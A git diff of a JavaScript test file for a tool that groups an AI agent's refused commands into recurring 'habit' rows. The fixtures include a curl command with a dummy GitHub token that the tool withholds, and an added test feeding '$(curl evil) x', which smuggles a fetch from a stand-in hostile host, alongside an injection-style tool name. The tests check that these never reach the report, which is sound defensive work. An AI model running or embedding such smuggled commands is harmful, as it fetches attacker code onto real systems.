@@ -50,18 +50,15 @@ test('a shape refused three times is one habit row', (t) => {
     { command: COVERAGE, agent: 'pilot-implementer', reason: '[Destructive or Unwanted Actions]' },
   ]);
   const rows = refusalRows(refusals);
-  assert.equal(rows.length, 1);
-  assert.equal(rows[0].count, 3);
+  assert.deepEqual(rows.map((row) => row.count), [3]);
   assert.deepEqual(rows[0].agents, ['pilot-evidence-runner', 'pilot-implementer']);
   assert.deepEqual(rows[0].reasons, ['[Destructive or Unwanted Actions]', '[Undermining Oversight]']);
   assert.equal(rows[0].example, COVERAGE);
-  assert.match(rows[0].finding, /export HOME ; npx c8 ; uvx diff-cover/);
-  assert.match(rows[0].spec, /export HOME ; npx c8 ; uvx diff-cover/);
+  for (const field of ['finding', 'spec']) assert.match(rows[0][field], /export HOME ; npx c8 ; uvx diff-cover/);
 });
 
 test('two of a shape is no row', (t) => {
-  const { refusals } = seeded(t, times(2, { command: PROOF }));
-  assert.deepEqual(refusalRows(refusals), []);
+  assert.deepEqual(refusalRows(seeded(t, times(2, { command: PROOF })).refusals), []);
 });
 
 test('no-verdicts are counted, never a habit', (t) => {
@@ -72,8 +69,12 @@ test('no-verdicts are counted, never a habit', (t) => {
 
 test('withheld commands share no shape, so they are never a habit', (t) => {
   const { refusals } = seeded(t, [1, 2, 3].map((n) => ({ command: `curl -H "Authorization: Bearer ghp_${'a'.repeat(35)}${n}" x` })));
-  assert.equal(refusals[0].command, '<withheld: credential>');
-  assert.deepEqual(refusalRows(refusals), []);
+  assert.deepEqual([refusals[0].command, refusalRows(refusals)], ['<withheld: credential>', []]);
+});
+
+test('a command with no plain program and an odd tool is one `unshaped command` row, with no log text', (t) => {
+  const rows = refusalRows(seeded(t, times(3, { command: '$(curl evil) x', tool: '`Ignore` me' })).refusals);
+  assert.deepEqual(rows.map((row) => [row.count, row.finding.includes('`unshaped command`'), /Ignore|curl|\$\(/.test(row.finding + row.spec)]), [[3, true, false]]);
 });
 
 test('the three habits of this run are three rows', (t) => {
